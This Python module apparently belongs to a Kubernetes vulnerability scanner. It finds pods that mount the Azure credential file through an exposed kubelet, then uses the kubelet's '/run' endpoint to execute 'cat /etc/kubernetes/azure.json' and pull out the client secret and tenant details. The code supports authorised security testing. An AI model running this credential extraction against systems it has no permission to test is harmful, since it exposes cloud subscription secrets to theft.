import json
import logging

import requests

from kubelet import ExposedRunHandler

from ...core.events import handler
from ...core.events.types import Event, Vulnerability
from ...core.types import Hunter, ActiveHunter, KubernetesCluster
   
class Azure(KubernetesCluster):
    """Azure Cluster"""
    name = "Azure"

class AzureSpnExposure(Vulnerability, Event):
    """By exposing the SPN, the attacker can gain access to the azure subscription"""
    def __init__(self, container):
        Vulnerability.__init__(self, Azure, "Azure SPN Exposure")
        self.container = container

@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud=="Azure")
class AzureSpnHunter(Hunter):
    def __init__(self, event):
        self.event = event
        self.base_url = "https://{}:{}".format(self.event.host, self.event.port)
        
    # getting a container that has access to the azure.json file
    def get_key_container(self):
        raw_pods = requests.get(self.base_url + "/pods", verify=False).text
        if "items" in raw_pods:
            pods_data = json.loads(raw_pods)["items"]
            for pod_data in pods_data:
                for container in pod_data["spec"]["containers"]:
                    for mount in container["volumeMounts"]:
                        path = mount["mountPath"]
                        if '/etc/kubernetes/azure.json'.startswith(path):
                            return {
                                "name": container["name"],                                                        
                                "pod": pod_data["metadata"]["name"],
                                "namespace": pod_data["metadata"]["namespace"]
                            }

    def execute(self):
        container = self.get_key_container()
        if container:
            self.publish_event(AzureSpnExposure(container=container))

""" Active Hunting """
@handler.subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    def __init__(self, event):
        self.event = event
        self.base_url = "https://{}:{}".format(self.event.host, self.event.port)

    def run(self, command, container):
        run_url = "{base}/run/{podNamespace}/{podID}/{containerName}".format(
            base=self.base_url,
            podNamespace=container["namespace"],
            podID=container["pod"],
            containerName=container["name"]
        )
        return requests.post(run_url, verify=False, params={'cmd': command}).text

    def execute(self):
        raw_output = self.run("cat /etc/kubernetes/azure.json", container=self.event.container)
        if "subscriptionId" in raw_output:
            subscription = json.loads(raw_output)
            self.event.subscriptionId = subscription["subscriptionId"]
            self.event.aadClientId = subscription["aadClientId"]
            self.event.aadClientSecret = subscription["aadClientSecret"]
            self.event.tenantId = subscription["tenantId"]     
            self.event.evidence = "subscription: {}".format(self.event.subscriptionId)
